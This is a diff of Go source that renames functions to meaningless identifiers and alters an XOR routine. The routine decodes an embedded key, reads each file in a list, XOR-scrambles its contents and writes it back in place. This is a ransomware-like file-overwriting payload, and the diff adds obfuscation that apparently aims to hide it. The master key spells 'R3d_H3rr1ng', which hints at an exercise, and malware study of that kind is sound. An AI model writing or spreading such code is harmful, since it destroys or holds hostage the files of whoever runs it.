@@ -8,20 +8,22 @@ import (
 	"strings"
 )
 
-func xor(input, key []byte) []byte {
+func loc123842(input, key []byte) []byte {
 	ret := make([]byte, len(input))
 	for i := 0; i < len(input); i++ {
-		ret[i] = input[i] ^ key[i%len(key)]
+		if input[i] != 0 && input[i] != key[i%len(key)] {
+			ret[i] = input[i] ^ key[i%len(key)]
+		}
 	}
 	return ret
 }
 
-func overWrite(file string) {
+func loc98237492(file string) {
 	master := []byte{82, 51, 100, 95, 72, 51, 114, 114, 49, 110, 103}
 	encKey := []byte{0, 122, 48, 12, 13, 112, 9, 59, 92, 30, 11, 18, 93, 16, 106, 23, 115, 0, 65, 110, 8, 18, 60, 108, 39, 23, 120, 3, 63, 15}
-	unEncKey := xor(encKey, master)
+	unEncKey := loc123842(encKey, master)
 	fileContents, _ := ioutil.ReadFile(file)
-	temp := xor(fileContents, unEncKey)
+	temp := loc123842(fileContents, unEncKey)
 	ioutil.WriteFile(file, temp, 0777)
 }
 
@@ -57,6 +59,6 @@ func main() {
 		log.Println(temp)
 	}
 	for _, v := range files {
-		overWrite(v)
+		loc98237492(v)
 	}
 }
